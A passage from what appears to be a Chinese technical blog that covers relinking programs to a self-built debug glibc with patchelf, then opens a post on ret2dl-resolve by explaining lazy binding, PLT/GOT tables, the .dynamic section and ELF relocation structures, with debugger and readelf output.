<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/home/glibc-test]</span><br><span class="line">└─# ./main</span><br><span class="line">Hello, world!</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/home/glibc-test]</span><br><span class="line">└─<span class="meta"># file main</span></span><br><span class="line">main: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/glibc/lib/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">27284e24</span>ab02fa64103591192dd8b3b006ae20f5, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, with debug_info, not stripped</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/home/glibc-test]</span><br><span class="line">└─<span class="meta"># ldd main</span></span><br><span class="line">        linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007ffe18b9d000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /home/glibc/lib/libc.so<span class="number">.6</span> (<span class="number">0x00007f1a6a9ec000</span>)</span><br><span class="line">        /home/glibc/lib/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> =&gt; /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007f1a6abc6000</span>)</span><br></pre></td></tr></table></figure>

<p>libc和动态链接器都改好了</p>
<p>如果想要编译成32位程序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc main.c -o main -Wl,--rpath=/home/glibc32/lib -Wl,--dynamic-linker=/home/glibc32/lib/ld-linux.so.2   -I/home/glibc/include -g -no-pie -m32</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/home/glibc-test]</span><br><span class="line">└─# ./main</span><br><span class="line">Hello, world!</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/home/glibc-test]</span><br><span class="line">└─# ┌──(root㉿Destroyer)-[/home/glibc-test]</span><br><span class="line">└─<span class="meta"># file main</span></span><br><span class="line">main: ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/glibc32/lib/ld-linux.so<span class="number">.2</span>, BuildID[sha1]=c2629c0f00b91e2caa60e88d0d27198bc71ff49c, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, with debug_info, not stripped</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/home/glibc-test]</span><br><span class="line">└─<span class="meta"># ldd main</span></span><br><span class="line">        linux-gate.so<span class="number">.1</span> (<span class="number">0xf7ef7000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /home/glibc32/lib/libc.so<span class="number">.6</span> (<span class="number">0xf7cd0000</span>)</span><br><span class="line">        /home/glibc32/lib/ld-linux.so<span class="number">.2</span> =&gt; /lib/ld-linux.so<span class="number">.2</span> (<span class="number">0xf7ef9000</span>)</span><br></pre></td></tr></table></figure>

<p>libc和动态链接器都改好了</p>
<p>此时使用gdb调试程序也是可以看到动态链接器的源码的</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240813215802807.png" alt="image-20240813215802807"></p>
<p>也可以看到ld中的符号<code>link_map</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; info types link_map</span><br><span class="line">All types matching regular expression <span class="string">&quot;link_map&quot;</span>:</span><br><span class="line"></span><br><span class="line">File ../elf/link.h:</span><br><span class="line"><span class="number">101</span>:    <span class="class"><span class="keyword">struct</span> <span class="title">link_map_public</span>;</span></span><br><span class="line"></span><br><span class="line">File ../include/link.h:</span><br><span class="line"><span class="number">95</span>:     <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span>;</span></span><br><span class="line"><span class="number">286</span>:    <span class="class"><span class="keyword">struct</span> <span class="title">link_map_reldeps</span>;</span></span><br><span class="line"></span><br><span class="line">File ../nptl_db/db_info.c:</span><br><span class="line"><span class="number">40</span>:     <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> <span class="title">link_map</span>;</span></span><br><span class="line"></span><br><span class="line">File ../sysdeps/x86/linkmap.h:</span><br><span class="line"><span class="number">10</span>:     <span class="class"><span class="keyword">struct</span> <span class="title">link_map_machine</span>;</span></span><br></pre></td></tr></table></figure>





<h2 id="patch-elf修改程序链接glibc"><a href="#patch-elf修改程序链接glibc" class="headerlink" title="patch-elf修改程序链接glibc"></a>patch-elf修改程序链接glibc</h2><p>对于一个已经编译链接完毕,默认链接系统自带glibc的程序,如何让它使用我们编译的glibc呢</p>
<p>可以使用patch-elf修改程序，一是修改libc所在目录的位置，二是修改使用的链接器的绝对地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --<span class="built_in">set</span>-rpath /home/glibc/lib/ --<span class="built_in">set</span>-interpreter /home/glibc/lib/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> main</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/glibc-test]</span><br><span class="line">└─# make main</span><br><span class="line">gcc main.c -o main -no-pie -g -O0</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/home/glibc-test]</span><br><span class="line">└─# make ldd</span><br><span class="line">ldd main</span><br><span class="line">        linux-vdso.so.1 (0x00007fff8e1b2000)</span><br><span class="line">        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f02aebae000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007f02aedb3000)</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/home/glibc-test]</span><br><span class="line">└─# make patch</span><br><span class="line">patchelf --set-rpath /home/glibc/lib/ --set-interpreter /home/glibc/lib/ld-linux-x86-64.so.2 main</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/home/glibc-test]</span><br><span class="line">└─# make ldd</span><br><span class="line">ldd main</span><br><span class="line">        linux-vdso.so.1 (0x00007fff70bfc000)</span><br><span class="line">        libc.so.6 =&gt; /home/glibc/lib/libc.so.6 (0x00007f8ab9eef000)</span><br><span class="line">        /home/glibc/lib/ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f8aba126000)</span><br><span class="line">        </span><br><span class="line">┌──(root㉿Executor)-[/home/glibc-test]</span><br><span class="line">└─# ./main</span><br><span class="line">helloworld</span><br></pre></td></tr></table></figure>

<p>改完了之后ldd观察结果和在编译链接时指定我们的glibc效果是一样的</p>
<p>虽然改完了ld的地址看上去还是指向原来那个<code>/home/glibc/lib/ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2</code></p>
<p>但是调试观察实际上已经改过了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  info sharedlibrary </span><br><span class="line">From                To                  Syms Read   Shared Object Library</span><br><span class="line">0x00007f5aff5a5000  0x00007f5aff5c8f91  Yes         /home/glibc/lib/ld-linux-x86-64.so.2</span><br><span class="line">0x00007f5aff38f3c0  0x00007f5aff4d8c9d  Yes         /home/glibc/lib/libc.so.6</span><br></pre></td></tr></table></figure>








































      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/10/17/ret2dl-resolve/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/17/ret2dl-resolve/" class="post-title-link" itemprop="url">ret2dl-resolve</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-10-17 23:19:00" itemprop="dateCreated datePublished" datetime="2024-10-17T23:19:00+08:00">2024-10-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-11-23 21:32:09" itemprop="dateModified" datetime="2024-11-23T21:32:09+08:00">2024-11-23</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="ret2dl-resolve"><a href="#ret2dl-resolve" class="headerlink" title="ret2dl-resolve"></a>ret2dl-resolve</h1><p>在学习这部分之前，最好有带调试符号的libc和ld,</p>
<p>也就是说自己编译一个待调试符号的glibc</p>
<p>然后编译链接程序时指定使用我们的glibc,不用系统自带那个</p>
<p>或者用patchelf把程序链接的glibc调包</p>
<p>然而调试版和发行版调用的函数好像不太一样</p>
<h2 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h2><p>假设有程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Hello, world!\n&quot;</span>, <span class="number">14</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -O0 -g -no-pie -m32 -o test</span><br></pre></td></tr></table></figure>

<p>write函数位于libc.so中，main程序是如何与write符号链接的呢？</p>
<p>这个过程叫做延迟绑定，又叫做懒加载，意思是我们的程序第一次调用动态库中的符号时，动态连接器ld才会解析write函数</p>
<p>这个解析过程如下</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A1.png" alt="第一次解析"></p>
<p>经过第一次解析,write@got被填充了正确的write地址,此后的write调用将如图所示</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A2.png" alt="此后的调用"></p>
<p>这里面提到了两个表，PLT表，GOT表</p>
<p>如果gdb加了pwndbg插件，可以使用plt和got命令观察两者</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; elfheader</span><br><span class="line">0x8048194 - 0x80481b4  .interp</span><br><span class="line">0x80481b4 - 0x80481d8  .note.gnu.build-id</span><br><span class="line">0x80481d8 - 0x80481f8  .note.ABI-tag</span><br><span class="line">0x80481f8 - 0x8048218  .gnu.hash</span><br><span class="line">0x8048218 - 0x8048268  .dynsym</span><br><span class="line">0x8048268 - 0x80482d1  .dynstr</span><br><span class="line">0x80482d2 - 0x80482dc  .gnu.version</span><br><span class="line">0x80482dc - 0x804830c  .gnu.version_r</span><br><span class="line">0x804830c - 0x8048314  .rel.dyn</span><br><span class="line">0x8048314 - 0x8048324  .rel.plt</span><br><span class="line">0x8049000 - 0x8049020  .init</span><br><span class="line">0x8049020 - 0x8049050  .plt</span><br><span class="line">0x8049050 - 0x80491a6  .text</span><br><span class="line">0x80491a8 - 0x80491bc  .fini</span><br><span class="line">0x804a000 - 0x804a013  .rodata</span><br><span class="line">0x804a014 - 0x804a048  .eh_frame_hdr</span><br><span class="line">0x804a048 - 0x804a110  .eh_frame</span><br><span class="line">0x804bef8 - 0x804befc  .init_array</span><br><span class="line">0x804befc - 0x804bf00  .fini_array</span><br><span class="line">0x804bf00 - 0x804bff0  .dynamic</span><br><span class="line">0x804bff0 - 0x804bff4  .got</span><br><span class="line">0x804bff4 - 0x804c008  .got.plt</span><br><span class="line">0x804c008 - 0x804c010  .data</span><br><span class="line">0x804c010 - 0x804c014  .bss</span><br><span class="line"></span><br><span class="line">pwndbg&gt; plt</span><br><span class="line">0x8049030: __libc_start_main@plt</span><br><span class="line">0x8049040: <span class="built_in">printf</span>@plt</span><br><span class="line">pwndbg&gt; got</span><br><span class="line"></span><br><span class="line">GOT protection: Partial RELRO | GOT <span class="built_in">functions</span>: 2</span><br><span class="line"></span><br><span class="line">[0x804c000] __libc_start_main@GLIBC_2.34 -&gt; 0xf7cf8cf0 (__libc_start_main_impl) ◂— push   ebp</span><br><span class="line">[0x804c004] <span class="built_in">printf</span>@GLIBC_2.0 -&gt; 0x8049046 (<span class="built_in">printf</span>@plt+6) ◂— push   8</span><br></pre></td></tr></table></figure>



<h3 id="PLT的作用"><a href="#PLT的作用" class="headerlink" title="PLT的作用"></a>PLT的作用</h3><p>对每一个glibc中的函数func,都会有一个plt表项</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jmp * func@got</span><br><span class="line">push index</span><br><span class="line">jmp * _dl_runtime_resolve@got</span><br></pre></td></tr></table></figure>

<p>如果got中填写了正确的函数地址,则会直接调用该函数</p>
<p>如果got中填写了push index的地址,则调用_dl_runtime_resolve解析符号</p>
<p>解析符号的依据就是这个index,导入函数下标</p>
<p>.plt(procedure Linkage Table，过程链接表)</p>
<p>.plt.got专门用于存放<code>__cxa_finalize</code>函数的plt条目</p>
<h3 id="GOT的作用"><a href="#GOT的作用" class="headerlink" title="GOT的作用"></a>GOT的作用</h3><p>存放函数地址</p>
<p>如果尚未解析则存放对应函数plt中的下一条指令地址</p>
<p>GOT表分成两部分</p>
<p>.got和.got.plt</p>
<p>.got(Global Offset Table),全局变量地址表</p>
<p>.got.plt是全局函数地址表</p>
<p>前面我们所说的write@got实际上是<a href="mailto:&#119;&#x72;&#x69;&#116;&#101;&#x40;&#x67;&#x6f;&#x74;&#46;&#x70;&#108;&#x74;">&#119;&#x72;&#x69;&#116;&#101;&#x40;&#x67;&#x6f;&#x74;&#46;&#x70;&#108;&#x74;</a></p>
<p>.got表纯纯存放全局变量地址,有一个算一个,没有特别之处</p>
<p>.got.plt的前三个表项存放了特殊地址,其后的表项就是全局函数地址了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0804A000 14 9F 04 08                   _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC</span><br><span class="line">.got.plt:0804A000                                                                       ; DATA XREF: _init_proc+9↑o</span><br><span class="line">.got.plt:0804A000                                                                       ; _start+10↑o ...</span><br><span class="line">.got.plt:0804A004 00 00 00 00                   dword_804A004   dd 0                    ; DATA XREF: sub_80482D0↑r</span><br><span class="line">.got.plt:0804A008 00 00 00 00                   dword_804A008   dd 0                    ; DATA XREF: sub_80482D0+6↑r</span><br><span class="line">.got.plt:0804A00C 24 A0 04 08                   off_804A00C     dd offset __libc_start_main</span><br><span class="line">.got.plt:0804A00C                                                                       ; DATA XREF: ___libc_start_main↑r</span><br><span class="line">.got.plt:0804A010 28 A0 04 08                   off_804A010     dd offset write         ; DATA XREF: _write↑r</span><br><span class="line">.got.plt:0804A010                               _got_plt        ends</span><br></pre></td></tr></table></figure>

<h4 id="GOT-PLT-0-dynamic"><a href="#GOT-PLT-0-dynamic" class="headerlink" title=".GOT.PLT[0]&#x3D;.dynamic"></a>.GOT.PLT[0]&#x3D;.dynamic</h4><p>.GOT.PLT[0]存放.dynamic节的地址,在节头表中可以查看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/6.1.3_pwn_xdctf2015_pwn200# readelf -S test</span><br><span class="line">There are 35 section headers, starting at offset 0x1fbc:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">	...</span><br><span class="line">  [21] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">	...</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  p (processor specific)</span><br></pre></td></tr></table></figure>

<p>.dynamic节在0x08049f14,因此GOT[0]&#x3D;0x08049f14</p>
<p>这个节的作用是什么呢?</p>
<p>可以用readelf -d查看节内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/<span class="number">6.1</span><span class="number">.3</span>_pwn_xdctf2015_pwn200<span class="meta"># readelf -d test</span></span><br><span class="line"></span><br><span class="line">Dynamic section at offset <span class="number">0xf14</span> contains <span class="number">24</span> entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> <span class="number">0x00000001</span> (NEEDED)                     Shared library: [libc.so<span class="number">.6</span>]</span><br><span class="line"> <span class="number">0x0000000c</span> (INIT)                       <span class="number">0x80482ac</span></span><br><span class="line"> <span class="number">0x0000000d</span> (FINI)                       <span class="number">0x80484d4</span></span><br><span class="line"> <span class="number">0x00000019</span> (INIT_ARRAY)                 <span class="number">0x8049f0c</span></span><br><span class="line"> <span class="number">0x0000001b</span> (INIT_ARRAYSZ)               <span class="number">4</span> (bytes)</span><br><span class="line"> <span class="number">0x0000001a</span> (FINI_ARRAY)                 <span class="number">0x8049f10</span></span><br><span class="line"> <span class="number">0x0000001c</span> (FINI_ARRAYSZ)               <span class="number">4</span> (bytes)</span><br><span class="line"> <span class="number">0x6ffffef5</span> (GNU_HASH)                   <span class="number">0x80481ac</span></span><br><span class="line"> <span class="number">0x00000005</span> (STRTAB)                     <span class="number">0x804821c</span></span><br><span class="line"> <span class="number">0x00000006</span> (SYMTAB)                     <span class="number">0x80481cc</span></span><br><span class="line"> <span class="number">0x0000000a</span> (STRSZ)                      <span class="number">75</span> (bytes)</span><br><span class="line"> <span class="number">0x0000000b</span> (SYMENT)                     <span class="number">16</span> (bytes)</span><br><span class="line"> <span class="number">0x00000015</span> (DEBUG)                      <span class="number">0x0</span></span><br><span class="line"> <span class="number">0x00000003</span> (PLTGOT)                     <span class="number">0x804a000</span></span><br><span class="line"> <span class="number">0x00000002</span> (PLTRELSZ)                   <span class="number">16</span> (bytes)</span><br><span class="line"> <span class="number">0x00000014</span> (PLTREL)                     REL</span><br><span class="line"> <span class="number">0x00000017</span> (JMPREL)                     <span class="number">0x804829c</span></span><br><span class="line"> <span class="number">0x00000011</span> (REL)                        <span class="number">0x8048294</span></span><br><span class="line"> <span class="number">0x00000012</span> (RELSZ)                      <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x00000013</span> (RELENT)                     <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x6ffffffe</span> (VERNEED)                    <span class="number">0x8048274</span></span><br><span class="line"> <span class="number">0x6fffffff</span> (VERNEEDNUM)                 <span class="number">1</span></span><br><span class="line"> <span class="number">0x6ffffff0</span> (VERSYM)                     <span class="number">0x8048268</span></span><br><span class="line"> <span class="number">0x00000000</span> (<span class="literal">NULL</span>)                       <span class="number">0x0</span></span><br></pre></td></tr></table></figure>

<p>每一项都是一个<code>Elf32_Dyn</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure>

<p>这是一个键值对,键是d_tag,值要么是d_val要么是d_ptr</p>
<p>d_tag是一些枚举值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NULL    0   <span class="comment">/* Marks end of dynamic section */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NEEDED  1   <span class="comment">/* Name of needed library */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTRELSZ 2  <span class="comment">/* Size in bytes of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTGOT  3   <span class="comment">/* Processor defined value */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_HASH    4   <span class="comment">/* Address of symbol hash table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRTAB  5   <span class="comment">/* Address of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMTAB  6   <span class="comment">/* Address of symbol table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELA    7   <span class="comment">/* Address of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELASZ  8   <span class="comment">/* Total size of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRSZ   10  <span class="comment">/* Size in bytes of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMENT  11  <span class="comment">/* Size of one symbol table entry */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_INIT    12  <span class="comment">/* Address of init function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_FINI    13  <span class="comment">/* Address of termination function */</span></span></span><br></pre></td></tr></table></figure>



<p>这个节指示了很多信息,比如init函数和init_array的地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000000c</span> (INIT)                       <span class="number">0x80482ac</span></span><br><span class="line"><span class="number">0x00000019</span> (INIT_ARRAY)                 <span class="number">0x8049f0c</span></span><br></pre></td></tr></table></figure>

<p>比如符号表和字符串表地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00000005 (STRTAB)                     0x804821c</span><br><span class="line">0x00000006 (SYMTAB)                     0x80481cc</span><br></pre></td></tr></table></figure>

<p>比如重定位信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00000011</span> (REL)                        <span class="number">0x8048294</span></span><br></pre></td></tr></table></figure>



<p>这个表有何作用呢?</p>
<p>一是指导动态链接器进行</p>
<p>​	加载so</p>
<p>​	解析符号</p>
<p>​	重定位</p>
<p>​	调用初始化函数</p>
<p>二是运行时</p>
<p>​	延迟绑定</p>
<p>​	处理dlopen显示加载的函数</p>
<blockquote>
<p>关于重定位</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/6.1.3_pwn_xdctf2015_pwn200# readelf -r <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.dyn&#x27;</span> at offset 0x294 contains 1 entry:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">08049ffc  00000106 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.plt&#x27;</span> at offset 0x29c contains 2 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">0804a00c  00000207 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a010  00000307 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0</span><br></pre></td></tr></table></figure>

<p>每一个重定位表项都对应一个<code>Elf32_Rel</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;       <span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word    r_info;         <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>

<p>r_offset是符号got表项的虚拟地址</p>
<p>r_info是符号的重定位类型和符号下标</p>
